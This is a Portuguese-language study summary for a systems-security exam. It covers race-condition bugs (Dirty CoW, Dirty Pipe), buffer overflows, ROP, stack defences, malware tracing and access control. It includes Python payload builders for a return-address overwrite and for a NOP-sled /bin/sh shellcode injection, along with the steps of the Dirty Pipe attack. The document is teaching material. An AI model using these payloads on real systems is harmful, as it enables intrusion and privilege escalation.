# Resumo parte 2

## Perguntas da prova 2

### Microkernel x Monolítico
| Microkernel        | Monolítico           |
| ------------- |:-------------:|
|  2,1      |2,2 |
| 3,1      | 3,2      |

### Como funciona as técnias de Remendos e Trampolins em instrumenção de binários?

### ACL's x Capability's

### BufferOverflow + Canary + Endereço de Retorno
1. Canary : on
2. ASLR: off
3. NX: on

### Como fazer e utilizar um Shellcode em que você tem o endereço da variável char buff[64] (NX: Off, Canary: Off, ASLR: Off)


# Vulnerabilidade e Ataque em Sistemas

## TOCTOU (Time-of-check time-of-use)
Um bug causado por uma condição de corrida, condição em que o resultado do processo é dependete da sequência ou sincronia de outros eventos: A execução de operações em ordem não prevista pode levar o sistema a um estado inconsistente. Os problemas varia de computações incorretas a acessos indevidos.

### Dirty CoW
Condição de corrida no subsistema de Copy-On-Write, que é uma otimização usada para duplicar páginas de memória de maneira eficiente. Quando um processo solicita uma cópia de uma página, em vez de criar uma cópia imediatamente, o kernel permite que múltiplos processos compartilhem a mesma página em modo somente de leitura. Se um dos processos tenta modificar a página, uma cópia real é criada e a modificação é feita na nova página. Garantindo que os outros processos continuem a ver a versão original. A vulnerabilidade CoW explora a primeira condição de corrida entre a página de cópia em CoW e a gravação na memória. A vulnerabilidade ocorre da seguinte maneira:
1. Um processo tenta escrever num aquivo que ele não tem permissão
2. O S.O cria uma página de cópia na memória para o processo escrever.
3. Outro processo tenta causar um condição de corrida entre a criação da página cópia e o apontamento do ponteiro do processo para esse arquivo.
4. Essa condição permite que o ponteiro do processo ao invés de ter o ponteiro remapeado para a página cópia na memória, a condição de corrida entra em ação e reaponta o ponteiro para o arquivo original em memória.
5. O processo que pediu para escrever volta a execução, então o sistema verifica que ele tem permissão de escrita. O Sistema acha que o arquivo que ele está escrevendo é a cópia, então ele permite a escrita. Assim o processo malicioso agora pode escrever num arquivo que antes não podia.

### Dirty Pipe
Também que explora uma condição de corrida. Porém agora com PIPES. Pipes são como canos que faz a comunicação direta entre processos. A saída de um está ligada na entraga de outro. É realizado os seguintes passos para o ataque.
1. Criar um Pipe
2. Encher o determinado pipe com dados arbitrários.
3. Deixar a flag configurada em todas as instâncias de **struct pipe_buffer** no anel **struct pipe_inode_info**.
4. Unior os dados vindo do arquivo alvo (abrindo-o com a flag **O_RDONLY**) dentro do pipe pegando de um pouco antes do deslocamento falado.
5. Escreve dados arbitrário dentro do pipe. Estes dados sobreescreverão os dados do arquivo que estão em cache ao invés de criar um novo buffer anônimo (**struct pipe_buffer**), porque a flag **PIPE_BUF_FLAG_CAN_MERGE** está configurada.


## Buffer Overflow
Vulnerabilidade onde um programa permite a escrita de dados além dos limites de um buffer.
![Buffer exemplo](https://github.com/user-attachments/assets/6a537d2a-27bd-4da4-b8b4-d09e85262347 "Um buffer para exemplo")
Um possível código simples de B.O. poderia ser:
```python
import struct

# Endereço fictício da função secret_function (substitua pelo endereço real)
# Exemplo: suponha que o endereço seja 0x080484b6
secret_function_address = 0x080484b6

# Cria um payload para o exploit
# 64 bytes de preenchimento para atingir o endereço de retorno
payload = b"A" * 64

# Sobrescreve o endereço de retorno com o endereço da secret_function
payload += struct.pack("<I", secret_function_address)

# Exibe o payload que deve ser passado para o programa vulnerável
print(payload)
```

### Shellcode
Se o atacante não achar nem uma função que lhe é útil é possível usar um shellcode.
```python
import struct

# Shellcode para abrir /bin/sh
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# Substitua este endereço pelo endereço real do buff[64]
buff_address = 0xffffd5f0  # Exemplo fictício

# Montagem do payload
padding = b"\x90" * (64 - len(shellcode))  # NOP sled para garantir que o shellcode seja alcançado
payload = padding + shellcode  # Shellcode que será executado
payload += struct.pack("<I", buff_address)  # Sobrescreve o endereço de retorno

# Exibir o payload
print(payload)
```
A seguinte abaixo faz o seguinte:
1. **len(shellcode)**: Calcula o tamanho do shellcode em bytes.
2. **(64 - len(shellcode))**: Calcula quantos bytes restam no buffer de 64 bytes depois de inserir o shellcode.
3. **b"\x90" * (64 - len(shellcode))**: Cria uma sequência de bytes preenchida com instruções NOP para ocupar o espaço restante no buffer.
```python
padding = b'\x90' * (64 - len(shellcode))
```
Isto é, suponha que o shellcode tenha 20 bytes. O buffer tem 64 bytes. O restante, 44 bytes (64 - 20), será preenchido com NOPs. Isso significa que o exploit poderá redirecionar a execução para qualquer byte dentro desses 44 bytes de NOPs e ainda assim alcançar o shellcode, aumentando a chance de sucesso. Em resumo a linha **padding = b"\x90" * (64 - len(shellcode))** cria um "sled" de NOPs que preenche o buffer vulnerável até o shellcode.

Porém normalmente não temos permissão de execução na pilha. O que pode ser feito ?

### Return-oriented programming
A ideia do ROP é utilizar códigos já presentes no espaço de endereçamento do processo e que tem permissão de execução. Código presente no próprio programa ou em códigos de bibliotecas. Isso é realizado através da escolha de pedaços de códigos chamados "gadgets". Um getget é uma sequencia de instruções que são finalizadas com a instrução "ret".
![Um possível exemplo de ROP](https://github.com/user-attachments/assets/7bbc980e-1300-48f9-a7a9-f63e21b5edd8 "Exemplo de ROP").


## Defesas em sistema
As principais defesas em sistemas são:
- Canary
- NX
- ASLR

### Canary
É um valor arbitrário que, quando há uma violação de stack, seu valor é modificado. O Kernel vê que ele foi modificado e interrompe a execução do programa.

### NX
Basicamente, impede a execução de um código na stack.

#### ASLR
É a randomização de endereços no programa. Ele aleatoriza a localização de áreas da memória para dificultar a previsão dos endereços por atacantes.

## Trancing de artefatos maliciosos.
Processo de monitorar e registrar a execução de um programa, seja analisando seu código estático ou seu comportamento em tempo real. Existem dois métodos de tracing: **estático** e **dinâmico**:
- **Estático**: Análise de código-fonte ou binário sem executar o programa.
  - Ferramentas: IDA Pro, Ghidra, Radare2, strings, Oletools, androguard
  - Exemplo: Analisar um binário malicioso para descobrir strings suspeitas. 
  - Vantagens: Segurança, sem risco de executar código potencialmente malicioso. Também há a Identificação de Padrões, é possível de encontrar strings suspeitas, padrões de código malicioso e pontos de entrada de funções.
  - Limitações: Não detecta comportamento dinâmico, como carregamento de payloads em tempo de execução e técnicas que prejudicam a engenharia reversa, como ofuscação de caminhos.
  - Complexidade: analisar código ofuscado ou compactado pode ser extremamente difícil e demorado.
- **Dinâmico**: Execução e análise em ambiente controlado de algum binário suspeito.
  - Ferramentas: Strace, ftrace, Kprobes, Frida
  - Exemplos: Usar strace para monitorar as chamadas de sistema de um processo. Realizar o tracing de chamadas de funções tanto em user space e kernel space
  - Vantagens: Comportamento em Tempo Real, permite capturar e analisar comportamento malicioso em tempo real. Além de detectar atividades ocultas, pode revelar atividades que só ocorrem durante a execução, como exploração de vulnerabilidades e carga de payloads.
  - Limitações: Risco de Execução, executar código malicioso pode ser perigoso sem um ambiente seguro. Ambientes Controlados requerem setups especializados, como sandboxes ou máquinas virtuais. Além disso alguns Malwares identificam ambientes virtuais e mudam o comportamento.

## Defesas em sistemas:
São comuns em defesas de sistema:
- Sistemas de controle de acesso
- Sistemas de autenticação
- Logging
- Encriptação em nível de sistema de arquivos

**Covert Channels**: Métodos ocultos para transmitir informações que não são detectados por sistemas de monitoramento normais. Usam canais não destinados para comunicação, como manipulação de armazenamento ou timing.
**Side Channels**: Métodos de extrair informações indiretas com base em características físicas ou operacionais de um sistema. Usam dados como tempo de resposta, consumo de energia ou emissões eletromagnéticas para obter informações sensíveis.

### Hardening
Adoção de medidas de seguranças adicionais, normalmente reduzindo a superficie de ataques:
- Limitar o acesso administrativos com "sudo"
- Remoção de softwares/serviços desnecessários
- Restrição de execução em espaços de memória
- Binary hardening
  - Instrumentação de códigos legados.
  - Limitação via compilação
  - Limitação via ambiente de execução (eBPF)
- Sandbox
  - Containers
  - Máquinas virtuais

### Controle de acesso
**Quem** pode acessar, **o que** pode acessa e de que **forma**.
- Quem: sujeito, agentes
- O que: objetos
- Forma: Permissões
Para o controle de acesso é especificado **políticas** e **mecanismos**: O primeiro fala o que deve ser feito e sua modificação ao longo do tempo, o segundo falam como devem ser feito e implementam a política.
Matriz de controle de acesso

|       | Obj1 | Obj2 |   Obj3   |  Subj2  |
|-------|------|------|----------|---------|
| Subj1 | R    | RW   |          | send    |
| Subj2 |      | RX   |          | control |
| Subj3 | RW   |      |  RWX own |  recv   |

Manter essa tabela para todo o sistema é custoso por causa de sem tamanho e por ser altamente dinâmica. Porém é possível guardar por **colunas (ACL)** ou por **linhs (Capability ou CLits**):
- **Access Control Lists**: Sujeitos normalmente são agregados em grupos (Owner, Group, everyone), podem ter permissões negativas.
- **Capability-based Access Control**: Token de acesso (Imagem 3), para acessar um recurso, é preciso apresentar uma capability. Promove uma granularidade fina de controle de acesso e é fácil delegação de direitos de acesso.
![Imagem 3](https://github.com/user-attachments/assets/2dd27f18-8ab5-4e32-9199-ff6bed84ab15 "Capability example")
| **Critério**                | **ACLs (Access Control Lists)**                                  | **Capabilities**                                               |
|-----------------------------|------------------------------------------------------------------|----------------------------------------------------------------|
| **Conceito Básico**          | Lista associada a um objeto que define permissões de acesso.     | Atributos atribuídos a sujeitos especificando operações permitidas. |
| **Associação**               | Associado ao objeto.                                            | Associado ao sujeito (usuário/processo).                        |
| **Controle**                 | Controle de acesso baseado no objeto.                           | Controle de acesso baseado no sujeito.                          |
| **Granularidade**            | Permissões definidas para cada objeto individualmente.          | Permissões definidas para cada sujeito individualmente.         |
| **Segurança**                | Controle centralizado de permissões em objetos.                 | Controle distribuído de permissões, pode ser passado entre sujeitos. |
| **Revogação de Acesso**      | Simples, removendo a entrada da ACL do objeto.                  | Pode ser complicado, especialmente se capacidades forem transferidas. |
| **Flexibilidade**            | Alta, pode definir diferentes níveis de acesso para diferentes usuários e grupos. | Menos flexível, pois uma capability é específica a uma operação para um objeto. |
| **Name Spaces**              | Não é diretamente aplicável ou afetado.                         | Podem ser isolados ou associados a diferentes Name Spaces, limitando o escopo de capacidades. |
| **Setuid**                   | ACLs não são afetadas diretamente por setuid.                   | Capabilities podem ser influenciadas por setuid, concedendo permissões elevadas temporárias. |

### Anti Vírus
Software utilizado para prevenir, detectar e remover malwares. Não são perfeitos. Podem agir através de **assinatura** e **Heurísticas e Aprendizado de máquina**:
- **Assinaturas**: Identifica padrões dos bytes dos arquivos. Funcionamento parecido com IDSs, Existe um BD de assinaturas de malware onde o AV procura por padrões existentes e são de Fácil bypass. Um malware com novo padrão nunca será
detectado
- **Heurísticas e Aprendizado de máquina**: pode identificar malwares que não possuem assinaturas no banco de dados, porém é mas sucetível a falsos positivos.
Existem métodos de ofuscação para ambos os métodos:
- Encriptação/encoding de código
- Máquinas virtuais
- Modificações de comportamentos
- Mensagens trocadas pela rede não podem ser desfeitas.
Por fim, quarentena seria: quando detectado, um malware não é removido, mas sim colocado em quarentena com isso um usuário pode retirá-lo em caso de falso positivo.








